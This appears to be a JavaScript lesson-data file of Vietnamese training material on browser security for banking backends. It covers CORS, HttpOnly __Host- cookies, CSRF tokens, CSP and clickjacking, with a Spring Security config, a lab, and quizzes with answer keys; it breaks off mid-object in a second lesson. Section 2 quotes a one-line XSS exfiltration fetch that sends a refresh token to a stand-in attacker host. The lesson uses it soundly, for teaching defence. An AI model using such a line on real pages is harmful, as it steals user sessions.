window.LESSON_DETAILS = window.LESSON_DETAILS || {};

Object.assign(window.LESSON_DETAILS, {
  F1: {
    duration: "55 phút",
    difficulty: "Quan trọng – Bảo mật Trình duyệt & Full-Stack",
    codeLang: "java",
    teacherIntro: "Chào em, bước sang Học phần F, anh muốn phá bỏ ngay một định kiến rất nguy hiểm của nhiều lập trình viên Java thuần túy: 'Bảo mật trình duyệt là việc của đội Frontend, Backend chỉ cần kiểm tra JWT là xong!'. Thực tế tại các ngân hàng số lớn như Techcombank, MB, Vietcombank hay ACB, mỗi khi có đợt kiểm toán bảo mật (Pentest) trước ngày Go-Live, hơn một nửa số lỗ hổng mức High/Critical nằm ngay ở ranh giới giao tiếp giữa Trình duyệt và cổng Backend/BFF: cấu hình sai CORS làm lộ thông tin số dư sang web độc hại, lưu Refresh Token trong `localStorage` khiến chỉ một dòng mã XSS đánh cắp trọn phiên đăng nhập, hoặc thiếu cờ `SameSite` dẫn tới giả mạo lệnh chuyển tiền CSRF. Là một Senior Java Backend làm việc sát sườn với team React/Angular, chính em là người viết cấu hình `SecurityFilterChain`, sinh `Set-Cookie` header và trả về `Content-Security-Policy` — hiểu thấu cơ chế phòng thủ của trình duyệt sẽ biến em thành chốt chặn vững chắc cho cả đội dự án.",
    analogy: {
      title: "Sảnh giao dịch VIP có kính chống đạn, thẻ từ niêm phong và danh sách khách mời",
      body: "Em hãy tưởng tượng trình duyệt của khách hàng giống như một tòa nhà văn phòng chung nơi khách vừa mở tab Internet Banking ở phòng số 1, vừa vô tình mở tab web xem phim lậu đầy mã độc ở phòng số 2. Luật `Same-Origin Policy` chính là bức tường cách âm ngăn người ở phòng số 2 tự ý thò tay sang phòng số 1 đọc sao kê. Khi Frontend ngân hàng (`ib.finbank.vn`) gọi sang Backend (`bff.finbank.vn`), trình duyệt cử một anh bảo vệ chạy sang hỏi trước bằng gói tin `OPTIONS` (CORS Preflight): 'Ngân hàng có cho phép khách từ sảnh `ib.finbank.vn` mang thẻ định danh vào không?'. Còn chiếc thẻ phiên giao dịch nếu để hở trên mặt bàn (`localStorage`) thì nhân viên tạp vụ trà trộn vào phòng (`XSS`) chụp ảnh lấy mất ngay; ngược lại nếu niêm phong vào hộp khóa từ chỉ máy đọc của cổng ngân hàng mới mở được (`HttpOnly + Secure + SameSite=Strict Cookie` gắn tiền tố `__Host-`) thì kẻ gian dù lọt vào phòng cũng không thể rút trộm lõi thẻ mang về máy chủ của chúng!"
    },
    objectives: [
      "Hiểu tận gốc cơ chế Same-Origin Policy (SOP), luồng CORS Preflight (`OPTIONS`) và cấu hình `CorsConfigurationSource` an toàn tuyệt đối trên Spring Security 6.",
      "Phân tích được rủi ro chí mạng của việc lưu Token trong `localStorage` so với `HttpOnly + Secure + SameSite` Cookie kết hợp tiền tố bảo vệ `__Host-` chống Cookie Tossing.",
      "Thiết kế được hệ thống phòng thủ chiều sâu chống bộ ba tấn công XSS, CSRF và Clickjacking bằng `Content-Security-Policy (CSP)`, `CookieCsrfTokenRepository` và `frame-ancestors`."
    ],
    flow: [
      {
        step: "1. Kiểm tra Nguồn gốc & Đàm phán CORS Preflight (OPTIONS)",
        detail: "Khi SPA tại `https://ib.finbank.vn` gửi request kèm header `Idempotency-Key` sang `https://bff.finbank.vn`, trình duyệt tự động bắn request `OPTIONS` trước. Backend đối chiếu danh sách Origin trắng và trả `Access-Control-Max-Age: 3600` để trình duyệt nhớ trong 1 giờ, không hỏi lại mỗi lần bấm nút."
      },
      {
        step: "2. Cấp phát Phiên Niêm phong bằng `__Host-` HttpOnly Cookie",
        detail: "Đăng nhập thành công, Backend trả header `Set-Cookie: __Host-ib_session=...; HttpOnly; Secure; SameSite=Strict; Path=/`. JavaScript trên trình duyệt hoàn toàn mù trước giá trị cookie này, triệt tiêu nguy cơ đọc trộm phiên qua `document.cookie`."
      },
      {
        step: "3. Xác thực Kép Chống Giả mạo Lệnh (CSRF Defense-in-Depth)",
        detail: "Với các lệnh thay đổi số dư (`POST / PUT / DELETE`), ngoài `SameSite=Strict`, Backend yêu cầu trình duyệt đọc mã CSRF từ cookie phụ `__Host-ib_csrf` và đính kèm vào header `X-XSRF-TOKEN` — điều mà trang web giả mạo bên ngoài không bao giờ đọc và gắn vào được."
      },
      {
        step: "4. Khóa Môi trường Thực thi bằng CSP & Chống Clickjacking",
        detail: "Mọi phản hồi trả kèm `Content-Security-Policy` chặn hoàn toàn inline script lạ, khóa danh sách tên miền được phép kết nối mạng (`connect-src`) và cấm nhúng giao diện ngân hàng vào thẻ `<iframe>` lừa đảo (`frame-ancestors 'none'`)."
      }
    ],
    sections: [
      {
        heading: "1. Giải phẫu Same-Origin Policy (SOP) và những cái bẫy cấu hình CORS trên Production",
        paragraphs: [
          "Điểm mấu chốt đầu tiên anh cần em khắc cốt ghi tâm: **CORS KHÔNG PHẢI là tường lửa bảo vệ Backend khỏi Postman hay hacker gọi bằng `curl`**, mà CORS là cơ chế Backend chỉ thị cho Trình duyệt nới lỏng quy tắc `Same-Origin Policy` một cách có kiểm soát. Hai URL chỉ được coi là cùng Origin khi khớp chính xác cả 3 thành phần: `Scheme` (`https`), `Host` (`ib.finbank.vn`) và `Port` (`443`). Chỉ cần lệch tên miền phụ từ `https://ib.finbank.vn` sang `https://api.finbank.vn` là trình duyệt lập tức kích hoạt kiểm duyệt Cross-Origin. Đặc biệt, hễ Frontend gửi JSON (`Content-Type: application/json`) hoặc gắn thêm bất kỳ custom header chuẩn ngân hàng nào như `Idempotency-Key`, `X-Correlation-Id`, trình duyệt sẽ coi đó là 'Non-simple Request' và tự động chặn lại để gửi một gói tin thăm dò `HTTP OPTIONS` (gọi là **Preflight Request**) trước khi gửi lệnh chuyển tiền thật.",
          "Hai sai lầm kinh điển nhất mà anh từng bắt gặp khi review code các dự án ngân hàng mới là: Thứ nhất, thấy lỗi đỏ CORS trên Console liền cấu hình bừa `allowedOriginPatterns(\"*\")` kèm `allowCredentials(true)` — điều này tương đương với việc phản chiếu lại mọi header `Origin` bất kỳ, cho phép một trang web độc hại `https://nhan-qua-tri-an.xyz` dùng chính cookie đang đăng nhập của khách để đọc trộm danh sách tài khoản! Thứ hai, quên cấu hình `Access-Control-Max-Age`, khiến cứ mỗi 1 API nghiệp vụ trình duyệt lại phải tốn thêm 1 vòng bắt tay mạng `OPTIONS` vô nghĩa, làm tăng gấp đôi tải trên API Gateway vào khung giờ cao điểm trả lương."
        ],
        bullets: [
          "Danh sách trắng tường minh (Strict Origin Allowlist): Chỉ khai báo chính xác các tên miền chính chủ như `https://ib.finbank.vn` từ biến môi trường cấu hình tập trung; tuyệt đối không phản chiếu động header `Origin` không kiểm chứng.",
          "Tối ưu Preflight Cache (`maxAge`): Đặt `Access-Control-Max-Age: 3600` (1 giờ) để trình duyệt lưu kết quả cấp phép Preflight vào bộ nhớ đệm nội bộ, cắt giảm ngay 50% số lượng gói tin điều khiển tới BFF.",
          "Mở khóa Spring Security cho `OPTIONS`: Gói tin Preflight của trình duyệt KHÔNG BAO GIỜ mang theo Cookie hay `Authorization` header; nếu bộ lọc xác thực JWT của em chặn luôn phương thức `OPTIONS` trả về `401`, Frontend sẽ báo lỗi CORS dù cấu hình Origin hoàn toàn đúng!"
        ]
      },
      {
        heading: "2. Cuộc chiến lưu trữ Phiên & Token: Tại sao Ngân hàng cấm lưu Refresh Token vào `localStorage`?",
        paragraphs: [
          "Trong các dự án thương mại điện tử nhỏ, lập trình viên rất thích nhận chuỗi `accessToken` + `refreshToken` trong JSON body rồi gọi `localStorage.setItem('token', ...)` vì code cực nhanh. Nhưng trong ngành Tài chính - Ngân hàng (tuân thủ OWASP ASVS Level 3 và quy định an toàn thông tin của NHNN), lưu Token nhạy cảm dài hạn trong `localStorage` hoặc `sessionStorage` là điều cấm kỵ. Lý do rất thực tế: một trang Internet Banking hiện đại tải hàng trăm thư viện NPM và đôi khi có cả script phân tích hành vi/chăm sóc khách hàng. Nếu chỉ một thư viện chuỗi cung ứng bị dính mã độc (Supply-chain XSS) hoặc một lỗ hổng DOM XSS lọt qua, đoạn script độc hại chỉ cần 1 dòng `fetch('https://evil.cc/steal?t=' + localStorage.getItem('refreshToken'))` là chiếm đoạt toàn bộ quyền sinh sát tài khoản khách hàng ở bất kỳ máy tính nào trên thế giới!",
          "Giải pháp chuẩn mực nhất hiện nay là chuyển quản lý phiên vào **`HttpOnly + Secure + SameSite=Strict` Cookie** kết hợp **tiền tố bảo mật `__Host-`** (ví dụ `__Host-ib_session`). Cờ `HttpOnly` khóa hoàn toàn quyền truy cập từ `document.cookie` khiến XSS không thể trích xuất mã phiên mang đi bán. Cờ `Secure` ép chỉ truyền qua kênh mã hóa HTTPS. Cờ `SameSite=Strict` ngăn trình duyệt gửi kèm cookie khi người dùng bấm link từ trang ngoài (như email lừa đảo hay Facebook). Đặc biệt hơn, tiền tố `__Host-` là vũ khí bí mật của các Senior Architect: trình duyệt sẽ bắt buộc cookie đó KHÔNG được khai báo thuộc tính `Domain`, nhờ vậy nếu một tên miền phụ kém an toàn như `https://event-he.finbank.vn` (thuê agency ngoài viết landing page) bị hack, hacker cũng không thể thực hiện đòn **Cookie Tossing** ghi đè cookie phiên lên trang giao dịch chính `https://ib.finbank.vn`!"
        ],
        bullets: [
          "Cờ `HttpOnly` giảm thiểu thiệt hại XSS: Dù kẻ tấn công chèn được JS cũng không lấy cắp được định danh phiên gốc để mang về máy trạm riêng tái sử dụng lâu dài.",
          "Tiền tố `__Host-` chống chiếm quyền từ Subdomain: Bắt buộc hội tụ đủ 3 điều kiện (`Secure`, `Path=/`, và không có `Domain=...`), cô lập hoàn toàn vùng tin cậy của kênh ngân hàng lõi khỏi hàng chục subdomain vệ tinh.",
          "Nếu bắt buộc giữ Access Token ngắn hạn ở SPA: Chỉ lưu biến trong bộ nhớ RAM của JS closure (mất ngay khi F5) với thời hạn cực ngắn 2–3 phút, còn phiên gốc / Refresh Token bắt buộc nằm trong `HttpOnly` Cookie."
        ]
      },
      {
        heading: "3. Phòng thủ chiều sâu: Khóa chặt XSS bằng CSP, diệt tận gốc CSRF và Clickjacking",
        paragraphs: [
          "Khi đã chuyển sang dùng Cookie tự động đính kèm theo tên miền, kẻ thù truyền kiếp ngay lập tức xuất hiện là **CSRF (Cross-Site Request Forgery)**: kẻ gian dụ khách hàng đang đăng nhập ngân hàng mở một trang web trúng thưởng, trang này âm thầm submit một `<form action='https://bff.finbank.vn/api/transfer' method='POST'>`. Dù `SameSite=Strict` đã chặn hầu hết kịch bản từ domain lạ, nguyên tắc **Defense-in-Depth (Phòng thủ nhiều lớp)** trong ngân hàng không bao giờ đặt cược toàn bộ tài sản vào một lá chắn đơn lẻ (vì các subdomain cùng eTLD+1 như `blog.finbank.vn` vẫn được trình duyệt coi là `Same-Site`!). Do đó, mọi API thay đổi trạng thái vẫn phải bật CSRF Token (mô hình Double-Submit Cookie hoặc Synchronizer Token) kết hợp kiểm tra header `Origin`.",
          "Song song đó, để triệt tiêu tận gốc nơi sinh sôi của **XSS** và đòn bẫy giao diện tàng hình **Clickjacking** (hacker nhúng trang xác nhận chuyển tiền của ngân hàng vào một `<iframe>` trong suốt đè lên nút 'Nhận lì xì' để lừa khách tự tay bấm xác nhận), Backend cần phát hành bộ HTTP Security Headers cứng rắn. Trọng tâm là `Content-Security-Policy (CSP)`: nó hoạt động như bản hiến pháp ra lệnh cho trình duyệt chỉ được tải file JS từ chính tên miền ngân hàng (`script-src 'self'`), cấm chạy đoạn mã chèn trực tiếp `eval()` hay `<script>alert(1)</script>`, chỉ cho phép gọi API về đúng cổng BFF (`connect-src`) và tuyệt đối cấm mọi trang web khác nhúng khung giao diện thông qua chỉ thị `frame-ancestors 'none'`."
        ],
        bullets: [
          "Triển khai CSP an toàn không làm sập App: Luôn bật ở chế độ giám sát `Content-Security-Policy-Report-Only` trên môi trường Staging/Pilot trước để thu thập báo cáo vi phạm, sau khi sạch lỗi mới chuyển sang chế độ chặn thật.",
          "Chống Clickjacking kép: Kết hợp cả `X-Frame-Options: DENY` (tương thích trình duyệt đời cũ) và `Content-Security-Policy: frame-ancestors 'none'` (chuẩn hiện đại kiểm soát chính xác mọi tầng iframe cha).",
          "Phân biệt rạch ròi `Same-Origin` và `Same-Site`: `https://marketing.finbank.vn` và `https://ib.finbank.vn` là **khác Origin** nhưng lại là **cùng Site (Same-Site)**! Vì vậy chỉ riêng `SameSite=Strict` KHÔNG chặn được request bắn sang từ một subdomain bị chiếm quyền — bắt buộc phải có thêm CSRF Token + kiểm tra `Origin`."
        ]
      }
    ],
    comparison: {
      title: "Bảng đối chiếu chiến lược lưu trữ phiên & Token cho kênh Ngân hàng Số",
      headers: ["Cơ chế lưu trữ trên Trình duyệt", "Khả năng chống đọc trộm qua XSS", "Nguy cơ dính CSRF", "Phán quyết Kiến trúc Ngân hàng"],
      rows: [
        [
          "`localStorage` / `sessionStorage`",
          "Bằng 0 — Bất kỳ đoạn JS hay thư viện NPM thứ 3 bị nhiễm độc nào cũng đọc sạch kho token chỉ bằng 1 dòng lệnh",
          "Miễn nhiễm tự nhiên vì trình duyệt không tự động đính kèm vào request ẩn",
          "CẤM TUYỆT ĐỐI dùng để lưu Refresh Token hoặc Access Token có quyền giao dịch tài chính"
        ],
        [
          "Biến trong bộ nhớ RAM (JS Closure / Memory)",
          "Cao hơn Storage (không lộ trên ổ cứng, F5 là xóa), nhưng XSS chạy cùng ngữ cảnh vẫn có thể móc nối gọi API hộ",
          "Miễn nhiễm tự nhiên khi truyền qua `Authorization: Bearer` header",
          "Chấp nhận được cho Access Token siêu ngắn hạn (2–5 phút) nếu kết hợp Cookie HttpOnly giữ phiên làm mới"
        ],
        [
          "Cookie thường (`Domain=.finbank.vn`, thiếu `HttpOnly`)",
          "Rất kém — Lộ qua `document.cookie` và bị toàn bộ subdomain vệ tinh đọc/ghi đè (Cookie Tossing)",
          "Rất cao nếu thiếu `SameSite` và CSRF Token",
          "LOẠI BỎ — Cấu hình lỗi thời gây thủng ranh giới bảo mật giữa trang quảng cáo và trang Core Internet Banking"
        ],
        [
          "`__Host-` Cookie (`HttpOnly; Secure; SameSite=Strict`)",
          "Tối đa — JavaScript hoàn toàn mù trước giá trị cookie; khóa chặt vào đúng 1 host duy nhất qua HTTPS",
          "Rất thấp (chặn mọi cross-site, kết hợp thêm `X-XSRF-TOKEN` để chặn luôn tấn công từ subdomain nội bộ)",
          "CHUẨN VÀNG KHUYÊN DÙNG cho kiến trúc Internet Banking + cổng BFF hiện đại"
        ]
      ]
    },
    codeTitle: "Cấu hình Spring Security 6 chuẩn Ngân hàng: Strict CORS, CSP, Anti-CSRF & __Host- Session Cookie",
    code: [
      "@Configuration",
      "@EnableWebSecurity",
      "public class InternetBankingSecurityConfig {",
      "    @Bean",
      "    public SecurityFilterChain bankingFilterChain(HttpSecurity http) throws Exception {",
      "        CookieCsrfTokenRepository csrfRepo = CookieCsrfTokenRepository.withHttpOnlyFalse();",
      "        csrfRepo.setCookieName(\"__Host-ib_csrf\");",
      "        csrfRepo.setCookieCustomizer(c -> c.secure(true).sameSite(\"Strict\").path(\"/\"));",
      "        return http",
      "            .cors(Customizer.withDefaults())",
      "            .csrf(csrf -> csrf.csrfTokenRepository(csrfRepo))",
      "            .headers(headers -> headers",
      "                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)",
      "                .contentSecurityPolicy(csp -> csp.policyDirectives(",
      "                    \"default-src 'self'; script-src 'self'; connect-src 'self' https://bff.finbank.vn; \" +",
      "                    \"img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'\")))",
      "            .authorizeHttpRequests(auth -> auth",
      "                .requestMatchers(HttpMethod.OPTIONS, \"/**\").permitAll()",
      "                .requestMatchers(\"/api/v1/auth/login\", \"/actuator/health\").permitAll()",
      "                .anyRequest().authenticated())",
      "            .build();",
      "    }",
      "    @Bean",
      "    public CorsConfigurationSource corsConfigurationSource() {",
      "        CorsConfiguration cfg = new CorsConfiguration();",
      "        cfg.setAllowedOrigins(List.of(\"https://ib.finbank.vn\")); // Cấm tuyệt đối dấu \"*\"",
      "        cfg.setAllowedMethods(List.of(\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"));",
      "        cfg.setAllowedHeaders(List.of(\"Content-Type\", \"X-XSRF-TOKEN\", \"Idempotency-Key\", \"X-Correlation-Id\"));",
      "        cfg.setAllowCredentials(true);",
      "        cfg.setMaxAge(3600L); // Cache Preflight 1 giờ giảm nửa số vòng bắt tay mạng",
      "        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();",
      "        source.registerCorsConfiguration(\"/api/**\", cfg);",
      "        return source;",
      "    }",
      "    public ResponseCookie issueSessionCookie(String opaqueSessionId) {",
      "        return ResponseCookie.from(\"__Host-ib_session\", opaqueSessionId)",
      "            .httpOnly(true).secure(true).sameSite(\"Strict\").path(\"/\").maxAge(Duration.ofMinutes(15)).build();",
      "    }",
      "}"
    ].join("\n"),
    codeNotes: [
      "Tách bạch 2 loại Cookie: `__Host-ib_session` đặt `httpOnly(true)` để JS không bao giờ chạm tới định danh phiên thật; còn `__Host-ib_csrf` đặt `withHttpOnlyFalse()` có chủ đích để React/Angular đọc giá trị chống giả mạo và gửi lại qua header `X-XSRF-TOKEN`.",
      "Mở đường cho Preflight: Dòng `.requestMatchers(HttpMethod.OPTIONS, \"/**\").permitAll()` kết hợp `.cors(Customizer.withDefaults())` đảm bảo gói tin thăm dò không mang chứng thực của trình duyệt luôn được xử lý ở tầng `CorsFilter` trước khi bị chặn bởi bộ lọc phiên.",
      "Khai báo tường minh `allowedHeaders`: Nếu Backend quên liệt kê `Idempotency-Key` hoặc `X-Correlation-Id` trong `setAllowedHeaders`, mọi lệnh chuyển tiền từ trình duyệt có gắn các header này sẽ gãy ngay ở bước `OPTIONS`.",
      "Chỉ thị `connect-src 'self' https://bff.finbank.vn`: Kể cả khi mã độc vượt qua lớp lọc ban đầu, trình duyệt cũng chặn đứng mọi nỗ lực dùng `fetch()` hay `WebSocket` tuồn dữ liệu nhạy cảm ra máy chủ bên ngoài của kẻ tấn công."
    ],
    labGuide: {
      goal: "Dựng dịch vụ Spring Boot BFF chạy khác cổng với giao diện Web, kiểm chứng trực tiếp gói tin CORS Preflight, cơ chế khóa `HttpOnly` Cookie và chặn nhúng `<iframe>` bằng DevTools.",
      steps: [
        "Bước 1: Khởi tạo ứng dụng Spring Boot chạy HTTPS (hoặc `localhost:8443`) áp dụng `InternetBankingSecurityConfig` ở trên, cho phép Origin `https://localhost:5173` của ứng dụng Frontend.",
        "Bước 2: Từ giao diện Frontend gọi `POST /api/v1/transfers` kèm header `Idempotency-Key`. Mở tab Network trên Chrome DevTools (bật 'All') quan sát gói tin `OPTIONS` trả về `200 OK` kèm `Access-Control-Max-Age: 3600`, sau đó bấm gửi lần 2 để thấy trình duyệt không cần hỏi lại `OPTIONS` nữa.",
        "Bước 3: Mở tab Console trên trình duyệt gõ `document.cookie` và xác nhận chỉ nhìn thấy `__Host-ib_csrf`, còn `__Host-ib_session` hoàn toàn vô hình trước JavaScript dù vẫn xuất hiện đầy đủ trong tab Application -> Cookies.",
        "Bước 4: Tạo một file `evil.html` chạy ở cổng khác chứa thẻ `<iframe src='https://localhost:8443/...'>` và một lệnh `fetch()` trái phép, kiểm chứng trình duyệt lập tức chặn đứng cả hai kèm cảnh báo CSP `frame-ancestors 'none'` và lỗi CORS."
      ],
      expectedOutput: "API chính chủ giao tiếp mượt mà không lặp lại Preflight dư thừa; `document.cookie` không lộ mã phiên `HttpOnly`; trang giả mạo bên ngoài bị chặn 100% cả đọc dữ liệu chéo miền lẫn gài bẫy Clickjacking."
    },
    examTips: [
      "Bẫy phỏng vấn kinh điển: Hỏi 'Bật CORS xong có chặn được hacker dùng Python script bắn thẳng vào API không?' -> Trả lời dứt khoát là KHÔNG, CORS chỉ do trình duyệt thực thi hộ người dùng; phía Backend bắt buộc phải có Authentication, Rate Limit và WAF.",
      "Nhớ sự khác biệt chí mạng giữa `Same-Site` và `Same-Origin`: Một lỗ hổng trên `promo.nganhang.vn` vẫn gửi được request `Same-Site` sang `api.nganhang.vn`! Phải kết hợp tiền tố `__Host-`, kiểm tra header `Origin` và CSRF Token.",
      "Khi gặp lỗi 'CORS policy: Response to preflight request doesn't pass access control check: It does not have HTTP ok status', 90% nguyên nhân thực tế là Spring Security chặn `OPTIONS` trả về `401/403` hoặc Nginx/Ingress chặn thiếu header chứ không phải sai code Frontend."
    ],
    summaryTakeaways: [
      "`Same-Origin Policy` so khớp bộ ba `Scheme + Host + Port`; lệch bất kỳ thành phần nào kèm header tùy chỉnh sẽ kích hoạt `OPTIONS` Preflight cần được cache bằng `Access-Control-Max-Age`.",
      "Tuyệt đối không lưu Refresh Token hoặc định danh phiên dài hạn trong `localStorage`; hãy niêm phong bằng `__Host-` Cookie với đủ bộ cờ `HttpOnly; Secure; SameSite=Strict; Path=/`.",
      "Kết hợp `SameSite=Strict` với Double-Submit CSRF Token (`X-XSRF-TOKEN`) và kiểm chứng header `Origin` để miễn nhiễm cả tấn công CSRF từ web lạ lẫn từ subdomain nội bộ bị chiếm quyền.",
      "Triển khai `Content-Security-Policy` khóa chặt `script-src`, `connect-src` và `frame-ancestors 'none'` để vô hiệu hóa khả năng thực thi mã XSS và bẫy giao diện Clickjacking."
    ],
    lessonQuestions: [
      {
        question: "Trong quá trình tích hợp màn hình Chuyển khoản Nhanh (`https://ib.finbank.vn`) gọi sang cổng BFF (`https://bff.finbank.vn`), đội Frontend vừa bổ sung thêm header `Idempotency-Key` vào lệnh `POST /api/v1/transfers` thì toàn bộ giao dịch trên trình duyệt thất bại ngay lập tức với lỗi CORS Preflight `401 Unauthorized`, dù gọi bằng Postman vẫn thành công mỹ mãn. Nguyên nhân gốc rễ và cách xử lý chuẩn nhất ở phía Java Backend là gì?",
        options: [
          "Đổi cấu hình `Access-Control-Allow-Origin` thành dấu `*` để tắt hoàn toàn bước kiểm tra Preflight của trình duyệt.",
          "Yêu cầu đội Frontend xóa bỏ header `Idempotency-Key` và nhét mã chống trùng lặp vào URL query string để biến request thành Simple Request.",
          "Cấu hình Spring Security cho phép phương thức `OPTIONS` đi qua tầng lọc CORS không cần Cookie/JWT, đồng thời khai báo bổ sung `Idempotency-Key` vào `allowedHeaders` và đặt `maxAge` hợp lý.",
          "Tắt tính năng HTTPS giữa hai tên miền để trình duyệt coi hai máy chủ là cùng mạng tin cậy nội bộ."
        ],
        answer: 2,
        explanation: "Theo chuẩn W3C Fetch/CORS, khi thêm custom header `Idempotency-Key`, trình duyệt tự động gửi gói tin thăm dò `HTTP OPTIONS` KHÔNG đính kèm Cookie hay Authorization token. Nếu bộ lọc xác thực của Spring Security yêu cầu đăng nhập cho mọi request kể cả `OPTIONS` hoặc chưa khai báo `Idempotency-Key` trong `Access-Control-Allow-Headers`, bước Preflight sẽ trả `401/403` và trình duyệt hủy ngay lệnh chuyển tiền thật. Postman không thực thi SOP/Preflight nên không gặp lỗi này.",
        wrongReasons: [
          "Trình duyệt nghiêm cấm kết hợp `Access-Control-Allow-Origin: *` với `Access-Control-Allow-Credentials: true`, đồng thời mở toang `*` là lỗ hổng bảo mật nghiêm trọng.",
          "Gắn `POST` với `Content-Type: application/json` vốn dĩ đã kích hoạt Preflight, và việc bỏ header chuẩn sang query string làm bẩn access log cũng như phá vỡ thiết kế API chuẩn ngân hàng.",
          "",
          "Tắt HTTPS làm lộ toàn bộ thông tin tài chính trên đường truyền và làm vô hiệu hóa luôn các cookie gắn cờ `Secure` hay tiền tố `__Host-`."
        ]
      },
      {
        question: "Một ngân hàng triển khai trang sự kiện quay thưởng ngắn hạn tại `https://tet-vui.finbank.vn` (thuê đối tác bên ngoài phát triển) bên cạnh trang giao dịch chính `https://ib.finbank.vn`. Chuyên gia Pentest cảnh báo rằng nếu trang sự kiện bị gài mã độc XSS, kẻ tấn công có thể ghi đè cookie phiên hoặc gửi lệnh giả mạo sang trang giao dịch chính nếu cấu hình sơ hở. Tổ hợp biện pháp nào ở phía Backend giúp cô lập hoàn toàn rủi ro này?",
        options: [
          "Đặt thuộc tính `Domain=.finbank.vn` cho cookie phiên để cả hai trang dùng chung một cơ chế kiểm soát đồng bộ.",
          "Chuyển toàn bộ Refresh Token của `ib.finbank.vn` vào `localStorage` vì `localStorage` tách biệt theo từng Origin.",
          "Sử dụng tiền tố `__Host-` cho cookie phiên (`HttpOnly; Secure; SameSite=Strict; Path=/`, không đặt `Domain`), kết hợp kiểm tra chặt header `Origin` chỉ khớp `https://ib.finbank.vn` và bắt buộc `X-XSRF-TOKEN`.",
          "Chỉ cần bật mỗi cờ `SameSite=Strict` trên cookie phiên là đủ chặn 100% mọi tác động từ `tet-vui.finbank.vn`."
        ],
        answer: 2,
        explanation: "Hai tên miền `tet-vui.finbank.vn` và `ib.finbank.vn` khác Origin nhưng lại cùng Site (`finbank.vn`). Tiền tố `__Host-` cấm đặt thuộc tính `Domain`, ngăn chặn tuyệt đối đòn Cookie Tossing ghi đè cookie từ subdomain sự kiện sang trang chính; kết hợp kiểm tra đúng `Origin === https://ib.finbank.vn` và CSRF Token giúp chặn đứng mọi request giả mạo bắn chéo từ subdomain bị nhiễm độc.",
        wrongReasons: [
          "Đặt `Domain=.finbank.vn` chính là tự tay mở cửa cho trang sự kiện bị hack đọc/ghi chung phạm vi cookie với kênh ngân hàng lõi.",
          "Lưu Refresh Token trong `localStorage` khiến chính trang `ib.finbank.vn` phơi mình trước rủi ro bị đánh cắp toàn bộ kho token nếu dính bất kỳ lỗi XSS thư viện thứ 3 nào.",
          "",
          "Trình duyệt định nghĩa Site theo eTLD+1 (`finbank.vn`), nên request từ `tet-vui.finbank.vn` gọi sang `ib.finbank.vn` vẫn được tính là `Same-Site` và trình duyệt VẪN gửi kèm cookie `SameSite=Strict`!"
        ]
      }
    ]
  },

  F2: {
    duration: "55 phút",
    difficulty: "Trung cấp – Nâng cao (Full-Stack Tài chính)",
    codeLang: "typescript",
    teacherIntro: "Chào em, nếu ở phía Java chúng ta nâng niu từng con số bằng `BigDecimal` và khóa chặt giao dịch bằng `Idempotency-Key`, thì chỉ cần bước qua biên giới JSON sang trình duyệt là mọi bẫy ngầm lại chực chờ nổ tung! Anh từng trực tiếp xử lý một sự cố dở khóc dở cười ở cổng thanh toán doanh nghiệp: khách hàng nhập số tiền ngoại tệ `19.99` USD nhân với tỷ giá trên giao diện React để ký chữ ký số xác nhận, JavaScript tính ra số thực bị lệch mất đuôi `.00000000000004` khiến chữ ký số gửi xuống Java Backend bị từ chối hàng loạt! Chưa kể cảnh khách ngồi trong thang máy sóng 4G yếu, bấm nút 'Xác nhận chuyển tiền' 3 lần liên tiếp vì thấy màn hình đứng im — nếu Frontend tự sinh lại mã `Idempotency-Key` mới ở mỗi cú click thì mọi công sức làm chống trùng ở Backend đều đổ sông đổ bể! Bài học hôm nay sẽ giúp em nắm trọn bộ quy chuẩn TypeScript tài chính mà cả Frontend lẫn Backend Lead phải thống nhất trong bản thiết kế API.",
    analogy: {
      title: "Tờ ủy nhiệm chi in sẵn số seri duy nhất và chiếc máy tính tiền không có nút số thập phân trôi nổi",
      body: "Em hãy hình dung mỗi phiên khách mở màn hình chuyển khoản giống như giao dịch viên rút từ cuốn sổ ra **một tờ giấy Ủy nhiệm chi có đóng dấu chìm số Seri duy nhất (`Idempotency-Key`)**. Khi khách điền xong và bấm 'Gửi', cánh cửa kính lập tức khóa chốt cơ học (`inFlightRef`) không cho nhét thêm tờ thứ hai khi tờ thứ nhất đang chạy trong ống khí nén. Nếu đường ống bị kẹt giữa chừng (mạng chập chờn báo Timeout), khi khách bấm 'Thử gửi lại', giao dịch viên phải gửi lại **ĐÚNG tờ giấy mang số Seri cũ** đó để kho bạc phía sau nhận ra và không trừ tiền hai lần — chỉ khi nào khách xé bỏ tờ cũ để viết một giao dịch hoàn toàn mới thì mới được rút tờ giấy mang số Seri tiếp theo!"
    },
    objectives: [
      "Áp dụng Strict TypeScript và mô hình `Discriminated Unions` để loại bỏ 100% các trạng thái giao diện bất hợp lý (Impossible UI States) trên màn hình giao dịch.",
      "Triệt tiêu hoàn toàn sai số dấu phẩy động IEEE 754 và tràn số nguyên `MAX_SAFE_INTEGER` trên JavaScript bằng hợp đồng JSON kiểu chuỗi kết hợp `Decimal.js` / `BigInt`.",
      "Thiết kế cơ chế chống bấm đúp hai tầng: khóa đồng bộ tức thời bằng `useRef` và quản trị vòng đời `Idempotency-Key` bất biến khi thử lại do lỗi mạng."
    ],
    flow: [
      {
        step: "1. Khởi tạo Ý định Giao dịch & Cấp mã `Idempotency-Key`",
        detail: "Ngay khi mở Form chuyển khoản mới, UI sinh một mã `crypto.randomUUID()` lưu cố định trong bộ nhớ phiên làm việc của giao dịch đó, chưa bao giờ đổi mã nếu người dùng chỉ đang bấm thử lại vì mạng rớt."
      },
      {
        step: "2. Kiểm chứng Biên bằng Zod & Tính phí bằng `Decimal.js`",
        detail: "Dữ liệu nhập được xác thực nghiêm ngặt qua `Zod Schema` (định dạng tài khoản, hạn mức tối thiểu/tối đa, ký tự hợp lệ) và tính tổng tiền trích nợ kèm phí bằng `Decimal.js` khớp quy tắc làm tròn `HALF_EVEN` với Java `BigDecimal`."
      },
      {
        step: "3. Khóa Chốt Đồng bộ `inFlightRef` Chống Click Đúp Mili-giây",
        detail: "Khoảnh khắc sự kiện Submit kích hoạt, biến `inFlightRef.current = true` chặn đứng ngay lập tức cú click đúp thứ hai xảy ra trong 5ms trước cả khi React kịp cập nhật `disabled` lên nút bấm DOM."
      },
      {
        step: "4. Chuyển pha Máy trạng thái & Xoay vòng Mã an toàn",
